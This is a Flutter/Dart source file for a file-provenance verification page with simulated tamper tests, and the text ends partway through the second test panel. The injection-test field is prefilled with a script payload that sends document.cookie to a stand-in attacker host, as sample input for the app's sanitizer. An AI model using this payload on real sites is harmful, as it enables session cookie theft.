import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:file_picker/file_picker.dart';
import 'package:cross_file/cross_file.dart';
import 'package:desktop_drop/desktop_drop.dart';
import 'package:google_fonts/google_fonts.dart';

import '../../../shared/theme/cyber_theme.dart';
import '../../../shared/widgets/cyber_button.dart';
import '../../../main.dart'; // for ledgerProvider
import '../models/verification_models.dart';
import '../services/verification_service.dart';

class VerificationPage extends ConsumerStatefulWidget {
  const VerificationPage({super.key});

  @override
  ConsumerState<VerificationPage> createState() => _VerificationPageState();
}

class _VerificationPageState extends ConsumerState<VerificationPage> {
  late CompleteVerificationReport _report;
  bool _isDragging = false;
  int _activeQATab = 0; // 0: Bitstream, 1: Steganography, 2: Metadata Scrub, 3: Injection

  // Injection Attack Sandbox controller
  final TextEditingController _injectionController = TextEditingController(
    text: '<script>fetch("https://attacker.site/leak?k="+document.cookie)</script>',
  );

  String? _selectedTargetRecordId;
  Uint8List? _pristineOriginalBytes;
  String? _pristineOriginalFileName;

  @override
  void initState() {
    super.initState();
    _loadSampleAsset();
  }

  @override
  void dispose() {
    _injectionController.dispose();
    super.dispose();
  }

  void _loadSampleAsset() {
    final ledger = ref.read(ledgerProvider);
    final history = ledger.getHistory();
    final sampleRecord = history.where((r) => r.filePath.contains('satellite')).firstOrNull ?? history.firstOrNull;

    setState(() {
      _selectedTargetRecordId = sampleRecord?.id;
      _report = VerificationService.generateSampleAuthenticReport(sampleRecord);
      _pristineOriginalBytes = _report.fileBytes;
      _pristineOriginalFileName = _report.fileName;
    });
  }

  void _analyzeLoadedBytes(Uint8List bytes, String name) {
    _pristineOriginalBytes = bytes;
    _pristineOriginalFileName = name;
    final ledger = ref.read(ledgerProvider);
    final history = ledger.getHistory();

    // Reset target anchor if it was locked to the sample record, so auto-detect runs freely
    final sampleRecord = history.where((r) => r.filePath.contains('satellite')).firstOrNull ?? history.firstOrNull;
    String? targetId = _selectedTargetRecordId;
    if (targetId == sampleRecord?.id) {
      targetId = null;
    }

    final newReport = VerificationService.analyzeAsset(
      bytes: bytes,
      fileName: name,
      ledgerHistory: history,
      targetRecordId: targetId,
    );

    setState(() {
      _report = newReport;
      // Auto-sync target anchor selector to the matched sealed record so user sees it clearly
      _selectedTargetRecordId = newReport.matchedRecord?.id ?? targetId;
    });
  }

  void _setTargetRecord(String? recordId) {
    setState(() {
      _selectedTargetRecordId = recordId;
      if (_pristineOriginalBytes != null && _pristineOriginalFileName != null) {
        final ledger = ref.read(ledgerProvider);
        _report = VerificationService.analyzeAsset(
          bytes: _pristineOriginalBytes!,
          fileName: _pristineOriginalFileName!,
          ledgerHistory: ledger.getHistory(),
          targetRecordId: _selectedTargetRecordId,
        );
      }
    });
  }

  Future<void> _pickAndAnalyzeFile() async {
    final result = await FilePicker.platform.pickFiles(
      type: FileType.custom,
      allowedExtensions: [
        // Images
        'png', 'jpg', 'jpeg', 'webp', 'gif', 'bmp', 'tiff', 'svg', 'heic', 'ico',
        // Documents
        'pdf', 'doc', 'docx', 'odt', 'rtf', 'txt', 'pages', 'csv', 'xlsx', 'xls',
        // Presentations
        'ppt', 'pptx', 'odp', 'key', 'pps', 'ppsx',
        // Videos
        'mp4', 'mov', 'avi', 'mkv', 'webm', 'flv', 'wmv', 'm4v', '3gp',
        // Audios
        'mp3', 'wav', 'm4a', 'aac', 'flac', 'ogg', 'opus', 'wma', 'aiff',
        // Binary
        'bin',
      ],
    );
    if (result != null && result.files.isNotEmpty) {
      Uint8List? bytes;
      String name = result.files.single.name;
      if (kIsWeb) {
        bytes = result.files.single.bytes;
      } else {
        final path = result.files.single.path;
        if (path != null) {
          bytes = await XFile(path).readAsBytes();
        }
      }

      if (bytes != null) {
        _analyzeLoadedBytes(bytes, name);
      }
    }
  }

  void _toggleHexEditorAttack() {
    setState(() {
      if (_report.verdict == VerificationVerdict.bitstreamShattered) {
        // Restore pristine bytes of currently loaded file
        if (_pristineOriginalBytes != null && _pristineOriginalFileName != null) {
          final ledger = ref.read(ledgerProvider);
          _report = VerificationService.analyzeAsset(
            bytes: _pristineOriginalBytes!,
            fileName: _pristineOriginalFileName!,
            ledgerHistory: ledger.getHistory(),
            targetRecordId: _selectedTargetRecordId,
          );
        } else {
          _loadSampleAsset();
        }
      } else {
        // Shatter bitstream
        _report = VerificationService.simulateHexEditorAttack(_report);
      }
    });
  }

  void _toggleSteganographyAttack() {
    setState(() {
      if (_report.verdict == VerificationVerdict.steganographyAltered) {
        if (_pristineOriginalBytes != null && _pristineOriginalFileName != null) {
          final ledger = ref.read(ledgerProvider);
          _report = VerificationService.analyzeAsset(
            bytes: _pristineOriginalBytes!,
            fileName: _pristineOriginalFileName!,
            ledgerHistory: ledger.getHistory(),
            targetRecordId: _selectedTargetRecordId,
          );
        } else {
          _loadSampleAsset();
        }
      } else {
        _report = VerificationService.simulateSteganographyAttack(_report);
      }
    });
  }

  void _toggleMetadataScrubAttack() {
    setState(() {
      if (_report.verdict == VerificationVerdict.metadataScrubbed) {
        if (_pristineOriginalBytes != null && _pristineOriginalFileName != null) {
          final ledger = ref.read(ledgerProvider);
          _report = VerificationService.analyzeAsset(
            bytes: _pristineOriginalBytes!,
            fileName: _pristineOriginalFileName!,
            ledgerHistory: ledger.getHistory(),
            targetRecordId: _selectedTargetRecordId,
          );
        } else {
          _loadSampleAsset();
        }
      } else {
        _report = VerificationService.simulateMetadataScrub(_report);
      }
    });
  }

  void _runInjectionSanitizationTest() {
    final result = VerificationService.sanitizeInput(_injectionController.text);
    setState(() {
      _report = _report.copyWith(sanitization: result);
    });
  }

  @override
  Widget build(BuildContext context) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        // 1. Ingestion / Dropzone & Quick Action Bar
        _buildIngestionBar(),
        const SizedBox(height: 20),

        // 2. High-Impact Forensic Verdict Banner
        _buildForensicVerdictBanner(),
        const SizedBox(height: 24),

        // 3. 4-Pillar QA Protocol Navigation Tabs
        _buildQAProtocolTabs(),
        const SizedBox(height: 18),

        // 4. Active QA Attack Vector Interactive Panel
        _buildActiveQAPanel(),
      ],
    );
  }

  // ==========================================
  // 1. INGESTION & DROPZONE BAR
  // ==========================================
  Widget _buildIngestionBar() {
    final ledger = ref.watch(ledgerProvider);
    final history = ledger.getHistory();

    return DropTarget(
      onDragEntered: (_) => setState(() => _isDragging = true),
      onDragExited: (_) => setState(() => _isDragging = false),
      onDragDone: (details) async {
        setState(() => _isDragging = false);
        if (details.files.isNotEmpty) {
          final file = details.files.first;
          final bytes = await file.readAsBytes();
          _analyzeLoadedBytes(bytes, file.name);
        }
      },
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 22, vertical: 18),
        decoration: BoxDecoration(
          color: _isDragging ? const Color(0x28A855F7) : const Color(0x14FFFFFF),
          borderRadius: BorderRadius.circular(20),
          border: Border.all(
            color: _isDragging ? const Color(0xFFC084FC) : const Color(0x28FFFFFF),
            width: 1.2,
          ),
          boxShadow: [
            if (_isDragging)
              BoxShadow(
                color: CyberTheme.accentColor.withValues(alpha: 0.35),
                blurRadius: 20,
              ),
          ],
        ),
        child: Column(
          children: [
            Row(
              children: [
                Container(
                  width: 44,
                  height: 44,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    gradient: CyberTheme.shardGradient,
                    boxShadow: [
                      BoxShadow(
                        color: CyberTheme.accentColor.withValues(alpha: 0.35),
                        blurRadius: 14,
                      ),
                    ],
                  ),
                  child: const Icon(Icons.security_rounded, color: Colors.white, size: 22),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          Flexible(
                            child: Text(
                              _report.fileName,
                              style: GoogleFonts.plusJakartaSans(
                                fontSize: 14.5,
                                fontWeight: FontWeight.w800,
                                color: Colors.white,
                              ),
                              overflow: TextOverflow.ellipsis,
                            ),
                          ),
                          const SizedBox(width: 8),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 2),
                            decoration: BoxDecoration(
                              color: const Color(0x22C084FC),
                              borderRadius: BorderRadius.circular(100),
                              border: Border.all(color: const Color(0x40C084FC)),
                            ),
                            child: Text(
                              '${(_report.fileSizeBytes / 1024).toStringAsFixed(1)} KB',
                              style: GoogleFonts.jetBrainsMono(
                                fontSize: 9.5,
                                fontWeight: FontWeight.w800,
                                color: const Color(0xFFE9D5FF),
                              ),
                            ),
                          ),
                          if (_report.isRenamed) ...[
                            const SizedBox(width: 8),
                            Container(
                              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                              decoration: BoxDecoration(
                                color: const Color(0x2510B981),
                                borderRadius: BorderRadius.circular(100),
                                border: Border.all(color: const Color(0x6010B981)),
                              ),
                              child: Row(
                                mainAxisSize: MainAxisSize.min,
                                children: [
                                  const Icon(Icons.swap_horiz, size: 12, color: Color(0xFF34D399)),
                                  const SizedBox(width: 4),
                                  Text(
                                    'RENAMED (ORIGINAL: ${_report.originalSealedName})',
                                    style: GoogleFonts.jetBrainsMono(
                                      fontSize: 9.5,
                                      fontWeight: FontWeight.w800,
                                      color: const Color(0xFF34D399),
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ],
                        ],
                      ),
                      const SizedBox(height: 3),
                      Row(
                        children: [
                          Text(
                            'SHA-256: ${_report.bitstream.computedHash.substring(0, 16)}...${_report.bitstream.computedHash.substring(_report.bitstream.computedHash.length - 12)}',
                            style: GoogleFonts.jetBrainsMono(
                              fontSize: 11,
                              color: CyberTheme.textSecondary,
                            ),
                          ),
                          const SizedBox(width: 6),
                          InkWell(
                            onTap: () {
                              Clipboard.setData(ClipboardData(text: _report.bitstream.computedHash));
                              ScaffoldMessenger.of(context).showSnackBar(
                                const SnackBar(content: Text('Hash copied to clipboard!'), duration: Duration(seconds: 1)),
                              );
                            },
                            child: const Icon(Icons.copy, size: 12, color: Color(0xFFC084FC)),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 16),
                // Load Sample Button
                CyberButton(
                  variant: CyberButtonVariant.glassPill,
                  height: 40,
                  padding: const EdgeInsets.symmetric(horizontal: 16),
                  icon: Icons.auto_awesome,
                  onTap: _loadSampleAsset,
                  child: const Text('Sample Asset'),
                ),
                const SizedBox(width: 10),
                // Pick File Button
                CyberButton(
                  variant: CyberButtonVariant.whitePill,
                  height: 40,
                  padding: const EdgeInsets.symmetric(horizontal: 18),
                  icon: Icons.file_open_outlined,
                  onTap: _pickAndAnalyzeFile,
                  child: const Text('Inspect Local File'),
                ),
              ],
            ),

            // Sub-row: Air-Gapped Ledger Anchor Selector
            const SizedBox(height: 14),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
              decoration: BoxDecoration(
                color: Colors.black.withValues(alpha: 0.35),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: const Color(0x22FFFFFF)),
              ),
              child: Row(
                children: [
                  const Icon(Icons.hub_outlined, size: 16, color: Color(0xFFC084FC)),
                  const SizedBox(width: 8),
                  Text(
                    'AIR-GAPPED LEDGER ANCHOR:',
                    style: GoogleFonts.jetBrainsMono(
                      fontSize: 10,
                      fontWeight: FontWeight.w800,
                      color: const Color(0xFF94A3B8),
                      letterSpacing: 0.6,
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: DropdownButtonHideUnderline(
                      child: DropdownButton<String?>(
                        value: _selectedTargetRecordId,
                        dropdownColor: const Color(0xFF160F2B),
                        icon: const Icon(Icons.arrow_drop_down, color: Color(0xFFC084FC), size: 18),
                        isDense: true,
                        items: [
                          DropdownMenuItem<String?>(
                            value: null,
                            child: Text(
                              '⚡ Auto-Detect (Content SHA-256 / C2PA Claim) [${history.length} Sealed in Ledger]',
                              style: GoogleFonts.jetBrainsMono(
                                fontSize: 11,
                                fontWeight: FontWeight.w700,
                                color: const Color(0xFF34D399),
                              ),
                            ),
                          ),
                          ...history.map((r) {
                            final rName = r.filePath.replaceAll(r'\', '/').split('/').last;
                            final shortHash = '${r.originalFileHash.substring(0, 8)}...${r.originalFileHash.substring(r.originalFileHash.length - 6)}';
                            final lower = rName.toLowerCase();
                            String iconStr = '🔒';
                            if (lower.endsWith('.pdf')) {
                              iconStr = '📄';
                            } else if (lower.endsWith('.doc') || lower.endsWith('.docx') || lower.endsWith('.txt') || lower.endsWith('.rtf')) {
                              iconStr = '📝';
                            } else if (lower.endsWith('.ppt') || lower.endsWith('.pptx') || lower.endsWith('.odp')) {
                              iconStr = '📊';
                            } else if (lower.endsWith('.png') || lower.endsWith('.jpg') || lower.endsWith('.jpeg') || lower.endsWith('.webp')) {
                              iconStr = '🖼️';
                            } else if (lower.endsWith('.mp4') || lower.endsWith('.mov') || lower.endsWith('.avi') || lower.endsWith('.mkv')) {
                              iconStr = '🎬';
                            } else if (lower.endsWith('.mp3') || lower.endsWith('.wav') || lower.endsWith('.m4a') || lower.endsWith('.aac')) {
                              iconStr = '🎵';
                            }

                            return DropdownMenuItem<String?>(
                              value: r.id,
                              child: Text(
                                '$iconStr $rName  [$shortHash]',
                                style: GoogleFonts.jetBrainsMono(
                                  fontSize: 11,
                                  fontWeight: FontWeight.w600,
                                  color: Colors.white,
                                ),
                                overflow: TextOverflow.ellipsis,
                              ),
                            );
                          }),
                        ],
                        onChanged: _setTargetRecord,
                      ),
                    ),
                  ),
                  if (_report.matchedRecord != null) ...[
                    const SizedBox(width: 12),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                      decoration: BoxDecoration(
                        color: const Color(0x2034D399),
                        borderRadius: BorderRadius.circular(6),
                        border: Border.all(color: const Color(0x4034D399)),
                      ),
                      child: Row(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          const Icon(Icons.check_circle_outline, size: 12, color: Color(0xFF34D399)),
                          const SizedBox(width: 4),
                          Text(
                            'ANCHOR: ${_report.originalSealedName}',
                            style: GoogleFonts.jetBrainsMono(
                              fontSize: 9.5,
                              fontWeight: FontWeight.w700,
                              color: const Color(0xFF34D399),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ==========================================
  // 2. HIGH-IMPACT FORENSIC VERDICT BANNER
  // ==========================================
  Widget _buildForensicVerdictBanner() {
    Color bannerBg;
    Color bannerBorder;
    Color accentColor;
    IconData icon;
    String statusTitle;
    String statusSubtitle;

    switch (_report.verdict) {
      case VerificationVerdict.pristineSealed:
        bannerBg = const Color(0x1810B981);
        bannerBorder = const Color(0x6010B981);
        accentColor = const Color(0xFF34D399);
        icon = Icons.verified_user_rounded;
        statusTitle = 'CRYPTOGRAPHIC PROVENANCE INTACT — SEAL VALIDATED';
        if (_report.isRenamed) {
          statusSubtitle =
              'Matched Air-Gapped Seal: Originally sealed as "${_report.originalSealedName}". Renamed to "${_report.fileName}". SHA-256 bitstream is 100% bit-for-bit identical to sealed manifest in local ledger.';
        } else {
          statusSubtitle =
              'SHA-256 bitstream matches C2PA signed manifest in air-gapped ledger. Zero byte alterations. JUMBF assertion envelope verified.';
        }
        break;
      case VerificationVerdict.bitstreamShattered:
        bannerBg = const Color(0x22F43F5E);
        bannerBorder = const Color(0x80F43F5E);
        accentColor = const Color(0xFFFB7185);
        icon = Icons.gpp_bad_rounded;
        statusTitle = 'BITSTREAM SHATTERED — TAMPERING INTERCEPTION DETECTED';
        statusSubtitle = _report.originalSealedName != null
            ? 'Audited against sealed record "${_report.originalSealedName}". ${_report.matchReason != null && _report.matchReason!.isNotEmpty ? _report.matchReason! : "Microscopic corruption mathematically broke the SHA-256 seal. File content has diverged from sealed provenance manifest."}'
            : 'Microscopic single-byte corruption mathematically broke the SHA-256 seal. Silent alert logged; WebRTC dropped.';
        break;
      case VerificationVerdict.steganographyAltered:
        bannerBg = const Color(0x20A855F7);
        bannerBorder = const Color(0x80A855F7);
        accentColor = const Color(0xFFC084FC);
        icon = Icons.grain_rounded;
        statusTitle = 'EDGE-NATIVE INFERENCE DETECTED — STEGANOGRAPHIC DRIFT';
        statusSubtitle =
            'File envelope is intact, but visual tensor cross-check detected subtle pixel manipulation in Quadrant B.';
        break;
      case VerificationVerdict.metadataScrubbed:
        bannerBg = const Color(0x20F59E0B);
        bannerBorder = const Color(0x70F59E0B);
        accentColor = const Color(0xFFFBBF24);
        icon = Icons.link_off_rounded;
        statusTitle = 'METADATA SCRUBBED — CHAIN OF CUSTODY BROKEN';
        statusSubtitle =
            'C2PA JUMBF header returned NULL pointer. Provenance envelope stripped by third-party intermediary or compression.';
        break;
      case VerificationVerdict.unsealed:
        bannerBg = const Color(0x1894A3B8);
        bannerBorder = const Color(0x4094A3B8);
        accentColor = const Color(0xFFE2E8F0);
        icon = Icons.help_outline_rounded;
        statusTitle = 'UNSEALED ASSET — NO CRYPTOGRAPHIC ANCHOR FOUND';
        statusSubtitle =
            'This asset could not be auto-correlated with any sealed record in your air-gapped ledger. If this is an edited or renamed version of an asset you previously sealed, select its original seal in the anchor dropdown above to inspect divergence metrics.';
        break;
    }

    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 20),
      decoration: BoxDecoration(
        color: bannerBg,
        borderRadius: BorderRadius.circular(22),
        border: Border.all(color: bannerBorder, width: 1.2),
        boxShadow: [
          BoxShadow(
            color: accentColor.withValues(alpha: 0.22),
            blurRadius: 28,
            spreadRadius: -2,
          ),
        ],
      ),
      child: Row(
        children: [
          Container(
            width: 48,
            height: 48,
            decoration: BoxDecoration(
              color: accentColor.withValues(alpha: 0.20),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: accentColor.withValues(alpha: 0.40)),
            ),
            child: Icon(icon, color: accentColor, size: 26),
          ),
          const SizedBox(width: 18),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Text(
                      statusTitle,
                      style: GoogleFonts.plusJakartaSans(
                        fontSize: 15,
                        fontWeight: FontWeight.w900,
                        letterSpacing: 0.6,
                        color: Colors.white,
                      ),
                    ),
                    const SizedBox(width: 10),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 2),
                      decoration: BoxDecoration(
                        color: accentColor.withValues(alpha: 0.25),
                        borderRadius: BorderRadius.circular(100),
                        border: Border.all(color: accentColor.withValues(alpha: 0.5)),
                      ),
                      child: Text(
                        _report.verdict.name.toUpperCase(),
                        style: GoogleFonts.jetBrainsMono(
                          fontSize: 9,
                          fontWeight: FontWeight.w900,
                          color: accentColor,
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 4),
                Text(
                  statusSubtitle,
                  style: GoogleFonts.plusJakartaSans(
                    fontSize: 12.5,
                    color: CyberTheme.textSecondary,
                    height: 1.4,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ==========================================
  // 3. 4-PILLAR QA PROTOCOL NAVIGATION TABS
  // ==========================================
  Widget _buildQAProtocolTabs() {
    final tabs = [
      {'title': 'Test 1: Hex Editor Attack', 'subtitle': 'Bitstream Shatter (SHA-256)', 'icon': Icons.data_object_rounded},
      {'title': 'Test 2: Steganography Attack', 'subtitle': 'Edge-Native Inference', 'icon': Icons.remove_red_eye_rounded},
      {'title': 'Test 3: Metadata Scrub', 'subtitle': 'Social Media Interception', 'icon': Icons.layers_clear_rounded},
      {'title': 'Test 4: Injection Attack', 'subtitle': 'UI Sanitization Check', 'icon': Icons.shield_outlined},
    ];

    return Row(
      children: List.generate(tabs.length, (index) {
        final isActive = _activeQATab == index;
        final tab = tabs[index];

        return Expanded(
          child: Padding(
            padding: EdgeInsets.only(
              left: index == 0 ? 0 : 6,
              right: index == tabs.length - 1 ? 0 : 6,
            ),
            child: InkWell(
              onTap: () => setState(() => _activeQATab = index),
              borderRadius: BorderRadius.circular(16),
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                curve: Curves.easeOutCubic,
                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                decoration: BoxDecoration(
                  color: isActive ? const Color(0x28C084FC) : const Color(0x10FFFFFF),
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(
                    color: isActive ? const Color(0xFFC084FC) : const Color(0x24FFFFFF),
                    width: 1.2,
                  ),
                  boxShadow: isActive
                      ? [
                          BoxShadow(
                            color: CyberTheme.accentColor.withValues(alpha: 0.25),
                            blurRadius: 16,
                            offset: const Offset(0, 4),
                          ),
                        ]
                      : null,
                ),
                child: Row(
                  children: [
                    Icon(
                      tab['icon'] as IconData,
                      size: 20,
                      color: isActive ? const Color(0xFFC084FC) : const Color(0xFF94A3B8),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            tab['title'] as String,
                            style: GoogleFonts.plusJakartaSans(
                              fontSize: 12.5,
                              fontWeight: FontWeight.w800,
                              color: isActive ? Colors.white : const Color(0xFFE2E8F0),
                            ),
                          ),
                          const SizedBox(height: 2),
                          Text(
                            tab['subtitle'] as String,
                            style: GoogleFonts.plusJakartaSans(
                              fontSize: 10.5,
                              color: const Color(0xFF94A3B8),
                            ),
                            overflow: TextOverflow.ellipsis,
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        );
      }),
    );
  }

  // ==========================================
  // 4. ACTIVE QA ATTACK VECTOR INTERACTIVE PANEL
  // ==========================================
  Widget _buildActiveQAPanel() {
    switch (_activeQATab) {
      case 0:
        return _buildTest1BitstreamShatterPanel();
      case 1:
        return _buildTest2SteganographyPanel();
      case 2:
        return _buildTest3MetadataScrubPanel();
      case 3:
        return _buildTest4InjectionSanitizationPanel();
      default:
        return const SizedBox.shrink();
    }
  }

  // ------------------------------------------
  // PANEL 1: THE HEX EDITOR ATTACK
  // ------------------------------------------
  Widget _buildTest1BitstreamShatterPanel() {
    final b = _report.bitstream;
    final isTampered = !b.isMatch;

    return Container(
      padding: const EdgeInsets.all(24),
      decoration: BoxDecoration(
        color: const Color(0x14FFFFFF),
        borderRadius: BorderRadius.circular(22),
        border: Border.all(color: const Color(0x28FFFFFF), width: 1.0),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'TEST 1: THE HEX EDITOR ATTACK (BITSTREAM SHATTER)',
                    style: GoogleFonts.plusJakartaSans(
                      fontSize: 15,
                      fontWeight: FontWeight.w900,
                      color: Colors.white,
                      letterSpacing: 0.5,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    'Proves that changing a single microscopic binary byte shatters the SHA-256 cryptographic seal.',
                    style: GoogleFonts.plusJakartaSans(
                      fontSize: 12,
                      color: CyberTheme.textSecondary,
                    ),
                  ),
                ],
              ),
              CyberButton(
                variant: isTampered ? CyberButtonVariant.emerald : CyberButtonVariant.danger,
                height: 38,
                padding: const EdgeInsets.symmetric(horizontal: 18),
                icon: isTampered ? Icons.restore : Icons.offline_bolt_rounded,
                onTap: _toggleHexEditorAttack,
                child: Text(isTampered ? 'Restore Bitstream' : 'Simulate 1-Byte Hex Flip'),
              ),
            ],
          ),
          const SizedBox(height: 20),

          // Zero-Trust Correlation Reason Strip
          if (_report.matchReason != null && _report.matchReason!.isNotEmpty) ...[
            Container(
              margin: const EdgeInsets.only(bottom: 16),
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
              decoration: BoxDecoration(
                color: Colors.black.withValues(alpha: 0.28),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                  color: isTampered
                      ? const Color(0x40F43F5E)
                      : (_report.isRenamed ? const Color(0x4010B981) : const Color(0x20FFFFFF)),
                ),
              ),
              child: Row(
                children: [
                  Icon(
                    _report.isRenamed ? Icons.swap_horiz_rounded : Icons.fingerprint_rounded,
                    size: 16,
                    color: _report.isRenamed ? const Color(0xFF34D399) : const Color(0xFFC084FC),
                  ),
                  const SizedBox(width: 10),
                  Expanded(
                    child: Text(
                      _report.matchReason!,
                      style: GoogleFonts.jetBrainsMono(
                        fontSize: 11,
                        color: const Color(0xFFE2E8F0),
                        height: 1.3,
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],

          // Side-by-Side Hash Comparison Card
          Container(
            padding: const EdgeInsets.all(18),
            decoration: BoxDecoration(
              color: Colors.black.withValues(alpha: 0.35),
              borderRadius: BorderRadius.circular(16),
              border: Border.all(
                color: isTampered ? const Color(0x50F43F5E) : const Color(0x3010B981),
              ),
            ),
            child: Column(
              children: [
                _buildHashRow(
                  label: _report.originalSealedName != null
                      ? 'SIGNED MANIFEST EXPECTED SEAL [${_report.originalSealedName}]'
                      : 'SIGNED MANIFEST EXPECTED HASH',
                  hash: b.manifestHash,
                  badgeText: _report.isRenamed ? 'SEALED IN LEDGER (RENAMED)' : 'ORIGINAL C2PA SEAL',
                  badgeColor: const Color(0xFF10B981),
                ),
                const Padding(
                  padding: EdgeInsets.symmetric(vertical: 12),
                  child: Divider(color: Color(0x20FFFFFF), height: 1),
                ),
                _buildHashRow(
                  label: 'COMPUTED BITSTREAM LIVE HASH [${_report.fileName}]',
                  hash: b.computedHash,
                  badgeText: isTampered ? 'SHATTERED MISMATCH' : (_report.isRenamed ? '100% BITSTREAM MATCH' : 'CRYPTOGRAPHIC MATCH'),
                  badgeColor: isTampered ? const Color(0xFFF43F5E) : const Color(0xFF10B981),
                  isMismatch: isTampered,
                ),
              ],
            ),
          ),
          const SizedBox(height: 18),

          // Operational Stealth Protocol & Hex Inspector
          Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              // Left: Byte-level Offset Info
              Expanded(
                flex: 1,
                child: Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: const Color(0x10FFFFFF),
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(color: const Color(0x20FFFFFF)),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        'BYTE INTEGRITY METRIC',
                        style: GoogleFonts.jetBrainsMono(
                          fontSize: 10,
                          fontWeight: FontWeight.w800,
                          color: const Color(0xFFC084FC),
                          letterSpacing: 0.8,
                        ),
                      ),
                      const SizedBox(height: 8),
                      Text(
                        isTampered
                            ? '1 BYTE FLIPPED AT OFFSET 0x0400'
                            : (_report.isRenamed
                                ? '0 BYTES ALTERED (IDENTICAL BITSTREAM)'
                                : '0 BYTES ALTERED (PERFECT PARITY)'),
                        style: GoogleFonts.jetBrainsMono(
                          fontSize: 12.5,
                          fontWeight: FontWeight.w800,
                          color: isTampered ? const Color(0xFFFB7185) : const Color(0xFF34D399),
                        ),
                      ),
                      const SizedBox(height: 6),
                      Text(
                        isTampered
                            ? 'Original Byte: 0x${b.originalByteValue?.toRadixString(16).padLeft(2, '0').toUpperCase()}  ➔  Tampered: 0x${b.tamperedByteValue?.toRadixString(16).padLeft(2, '0').toUpperCase()}'
                            : (_report.isRenamed
                                ? 'Content-addressed verification confirms bitstream is 100% identical to "${_report.originalSealedName}".'
                                : 'All 2,048 bytes identical to sealed C2PA JUMBF bitstream.'),
                        style: GoogleFonts.jetBrainsMono(
                          fontSize: 11,
                          color: const Color(0xFF94A3B8),
                        ),
                      ),
                    ],
                  ),
                ),
              ),
              const SizedBox(width: 14),

              // Right: Operational Stealth Notification
              Expanded(
                flex: 1,
                child: Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: isTampered ? const Color(0x1AF43F5E) : const Color(0x12FFFFFF),
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(
                      color: isTampered ? const Color(0x40F43F5E) : const Color(0x20FFFFFF),
                    ),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          Icon(
                            isTampered ? Icons.shield_outlined : Icons.shield_rounded,
                            size: 16,
                            color: isTampered ? const Color(0xFFFB7185) : const Color(0xFF34D399),
                          ),
                          const SizedBox(width: 8),
                          Text(
                            'OPERATIONAL STEALTH PROTOCOL',
                            style: GoogleFonts.jetBrainsMono(
                              fontSize: 10,
                              fontWeight: FontWeight.w800,
                              color: isTampered ? const Color(0xFFFB7185) : const Color(0xFF34D399),
                              letterSpacing: 0.8,
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 8),
                      Text(
                        isTampered
                            ? 'Silent Notification Dispatched: No loud alert shown to attacker. Air-gapped ledger silently updated (isTampered: true). WebRTC DTLS tunnel terminated.'
                            : 'Stealth Monitoring Active: Ledger synchronized. In-transit P2P transfers are cryptographically authorized.',
                        style: GoogleFonts.plusJakartaSans(
                          fontSize: 11.5,
                          color: CyberTheme.textSecondary,
                          height: 1.4,
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  // ------------------------------------------
  // PANEL 2: THE STEGANOGRAPHY ATTACK
  // ------------------------------------------
  Widget _buildTest2SteganographyPanel() {
    final s = _report.steganography;

    return Container(
      padding: const EdgeInsets.all(24),
      decoration: BoxDecoration(
        color: const Color(0x14FFFFFF),
        borderRadius: BorderRadius.circular(22),
        border: Border.all(color: const Color(0x28FFFFFF), width: 1.0),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'TEST 2: THE STEGANOGRAPHY ATTACK (EDGE-NATIVE INFERENCE)',
